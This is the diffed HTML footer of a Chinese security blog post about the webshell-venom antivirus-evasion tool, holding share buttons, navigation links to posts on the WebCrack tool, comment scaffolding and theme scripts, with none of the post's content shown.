+    <button title="分享到 Mastodon"onclick="javascript:shareOnMastodon(&#34;webshell-venom 3.3 :利用随机异或免杀任意php文件&#34;, &#34;https://yzddmr6.com/posts/webshell-venom-3-3/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/webshell-venom/">webshell-venom</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/webcrack-1/" class="prev" rel="prev" title="WebCrack:一键自动化日站工具"><i class="fas fa-angle-left fa-fw"></i>WebCrack:一键自动化日站工具</a>
+            <a href="/posts/webcrack-release/" class="next" rel="next" title="WebCrack：网站后台弱口令批量检测工具">WebCrack：网站后台弱口令批量检测工具<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yzddmr6" target="_blank" rel="noopener noreferrer">yzddMr6</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"zh_cn_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"sharerjs":true,"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
